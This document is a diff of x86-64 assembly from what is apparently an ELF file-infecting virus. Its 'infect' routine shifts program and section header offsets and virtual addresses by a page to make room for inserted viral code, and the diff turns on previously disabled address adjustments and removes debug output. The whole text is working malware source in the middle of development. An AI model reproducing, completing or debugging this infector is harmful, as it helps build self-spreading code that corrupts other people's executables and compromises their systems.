@@ -906,6 +906,7 @@ infect:
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
 				jne .mod_subsequent_phdr
+				;jne .mod_other_ptload_phdr
 				.mod_phdr_text_segment:			
 					;mov r12, checkphdrRXpasslen
 					;lea r13, checkphdrRXpass
@@ -945,20 +946,31 @@ infect:
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
-					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					;add dword r10d, [PAGESIZE]
-					;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-					;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					;add dword r10d, [PAGESIZE]
-					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
-					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
+					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add dword r10d, [PAGESIZE]
+					mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+					mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					add dword r10d, [PAGESIZE]
+					mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
+					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
+				;.mod_other_ptload_phdr:
+						
 			.mod_subsequent_phdr:
 				xor r11, r11
+				mov r11d, [vxoffset]
+				cmp r11d, 0
+				je .next_phdr
 				mov r11, [r13 + r12 + elf_phdr.p_offset]
-				cmp dword r11d, vxoffset
+				cmp r11d, [vxoffset]
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
+				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+				add dword r10d, [PAGESIZE]
+				mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+				mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+				add dword r10d, [PAGESIZE]
+				mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 		.next_phdr:
 			pop rcx
 			dec cx 
@@ -992,11 +1004,11 @@ infect:
 			;jl .next_shdr
 			jl .check_for_last_text_shdr
 			.check_for_last_text_shdr:
-				mov rdx, modvxshdrpass0len
-				lea rsi, modvxshdrpass0
-				mov rdi, STDOUT
-				mov rax, SYS_WRITE
-				syscall
+				;mov rdx, modvxshdrpass0len
+				;lea rsi, modvxshdrpass0
+				;mov rdi, STDOUT
+				;mov rax, SYS_WRITE
+				;syscall
 				mov r11, [r13 + r15 + elf_shdr.sh_addr]
 				;add dword r11d, [r13 + r15 + elf_shdr.sh_size]
 				add r11, qword [r13 + r15 + elf_shdr.sh_size]
@@ -1010,11 +1022,11 @@ infect:
 				mov [r13 + r15 + elf_shdr.sh_size], r10
 				jmp .next_shdr
 			.mod_subsequent_shdr:
-				mov rdx, modsubsequentshdrlen
-				lea rsi, modsubsequentshdr
-				mov rdi, STDOUT
-				mov rax, SYS_WRITE
-				syscall
+				;mov rdx, modsubsequentshdrlen
+				;lea rsi, modsubsequentshdr
+				;mov rdi, STDOUT
+				;mov rax, SYS_WRITE
+				;syscall
 				mov r11, [r13 + r15 + elf_shdr.sh_offset]
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
